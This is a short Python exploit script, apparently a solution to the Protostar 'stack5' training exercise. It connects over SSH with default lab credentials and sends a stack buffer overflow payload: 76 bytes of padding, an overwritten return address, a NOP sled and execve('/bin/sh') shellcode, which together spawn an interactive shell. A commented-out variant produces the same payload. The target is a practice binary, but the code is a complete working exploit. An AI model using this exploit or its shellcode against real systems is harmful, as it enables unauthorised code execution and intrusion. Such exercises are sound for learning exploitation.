#!/usr/bin/env python
from pwn import *
import sys
offset = 76
addrStack = 0xbffff6dc
if len(sys.argv) < 2:
    print("usage: ./%s <ip>" % sys.argv[0])
else:
    s = ssh("user", sys.argv[1], 22, password="user")
    shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
    payload = 'A' * offset
    payload += p32(addrStack + 40)
    payload += '\x90' * 100
    payload += shellcode
    payload += '\n'
    r = s.run('/opt/protostar/bin/stack5')
    r.send(payload)
    r.interactive()
    r.close()
'''
import struct
offset = "A"*76
sp = struct.pack("I", 0xbffff6dc + 40)
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

nops = '\x90'*100

print offset + sp + nops + shellcode
'''
# does work with lower using : python print.py > text
# and                        : cat text - | /opt/protostar/bin/stack5
